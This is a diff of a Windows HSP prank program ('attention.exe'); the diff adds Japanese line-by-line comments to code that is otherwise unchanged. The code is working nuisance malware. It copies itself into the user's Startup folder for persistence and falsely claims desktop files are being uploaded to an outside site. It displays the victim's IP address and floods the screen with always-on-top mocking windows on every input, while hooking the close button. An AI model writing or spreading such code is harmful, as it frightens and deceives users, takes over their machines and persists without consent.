@@ -1,54 +1,54 @@
-	#packopt name "attention"
-	#include "Hspsock.as"
-	filepath=dir_exe
-	deskpath=dir_desktop
-	startuppath=dirinfo(0x10007)
-	exec "xcopy"+" \""+filepath+"\" \""+startuppath+"\\hello\" /I /E /D /C"
-	wait 1
-	cl=0
+	#packopt name "attention" //コンパイル時にattention.exeとして出力
+	#include "Hspsock.as" //必須ライブラリ
+	filepath=dir_exe //実行ファイルがあるディレクトリを変数にコピー
+	deskpath=dir_desktop //デスクトップのディレクトリを変数にコピー
+	startuppath=dirinfo(0x10007) //各ユーザーのスタートアップディレクトリをry
+	exec "xcopy"+" \""+filepath+"\" \""+startuppath+"\\hello\" /I /E /D /C" //スタートアップにファイルをコピー
+	wait 1 //1ミリ秒待つ、これがないと重い
+	cl=0 //変数初期化
 
-	AAA=1
-	FFF=9999999
-	GGG=999999999
-	screen 0,728,128,4
-	gsel 0,2				
+	AAA=1 //ウィンドウIDを設定
+	FFF=9999999 //煽りウィンドウ用のID、つまりこの数値を超えるウィンドウを開いたらバグるけど多分そこまでやるの疲れる
+	GGG=999999999 //これは最終的に消した
+	screen 0,728,128,4 //最初のハッキングしてる風ウィンドウの初期化
+	gsel 0,2 //ウィンドウを絶対最前面にする
 	
-	ipget
-	title "データを転送しています…"
-	mes dir_desktop+"のデータをhttps://enoki.xyzを通じてえのきのPCにコピーしています…"
+	ipget //IPアドレスを変数refstrにコピー
+	title "データを転送しています…" //ウィンドウタイトルの設定
+	mes dir_desktop+"のデータをhttps://enoki.xyzを通じてえのきのPCにコピーしています…" //煽りメッセージ
 	mes "閉じようとしても無駄です、かかってきなさい"
-	mes "あなたのIPアドレス:"+refstr
-	onexit gosub *DestroyWindow
+	mes "あなたのIPアドレス:"+refstr //IPアドレスが本当に表示されるけど、表示されるだけ
+	onexit gosub *DestroyWindow //バツボタンが押されたときにどこに飛ぶかを設定
 	
-	while
+	while //無限ループ
 		while
-			stick cl,2047,0
-			if cl!=0 : _break
-			wait 1
-		wend
+			stick cl,2047,0 //キーボード、マウスが押されたらその値を変数clに代入
+			if cl!=0 : _break //0→入力無し、0ではない→何か押されている
+			wait 1 //これも1ミリ秒待つだけ、ないと重くなる
+		wend //while終了
 	
-		if cl!=0:gosub *lbuttondown
+		if cl!=0:gosub *lbuttondown //キーボードかマウスから入力があったらジャンプ
 	wend
 
 
-	stop
+	stop //プログラムを停止
 
-*lbuttondown
+*lbuttondown //ここからは全部サブルーチン、ここはキーボードかマウスが押されたときに飛ぶ場所
 ;	1=左ボタン、3=右ボタン+左ボタン、5=Shiftキー+左ボタン、
 ;	9=Ctrlキー+左ボタン
-	AAA+=5
+	AAA+=5			//AAAからEEEまで作ってるけど多分意味はない
 	BBB=AAA+1
 	CCC=BBB+1
 	DDD=CCC+1
 	EEE=DDD+1
-	screen AAA,800,140,4
-	gsel AAA,2				
-	width 0,0,rnd(1920),rnd(1080)
-	font "メイリオ",rnd(64)+9
-	mes "ざまあwww"
-	title "ざまあwww"
-	wait 1
-	screen BBB,500,500,4
+	screen AAA,800,140,4 //新規画面を作成
+	gsel AAA,2		//最前面固定
+	width 0,0,rnd(1920),rnd(1080) //ウィンドウ位置をランダムに
+	font "メイリオ",rnd(64)+9 //フォントサイズをランダムに
+	mes "ざまあwww" //煽る
+	title "ざまあwww" //煽りタイトル
+	wait 1 //うん、もうわかるね
+	screen BBB,500,500,4 //ここからは繰り返し
 	gsel BBB,2				
 	width 0,0,rnd(1920),rnd(1080)
 	font "メイリオ",rnd(64)+9
@@ -117,10 +117,10 @@
 	title "ざまあwww"
 	wait 1
 
-	return
+	return //サブルーチンなのでしっかりメインに戻す
 
 
-*DestroyWindow
+*DestroyWindow //ここもサブプーチン
 ;	バツボタンが押された時の初期化
 ;	煽る
 
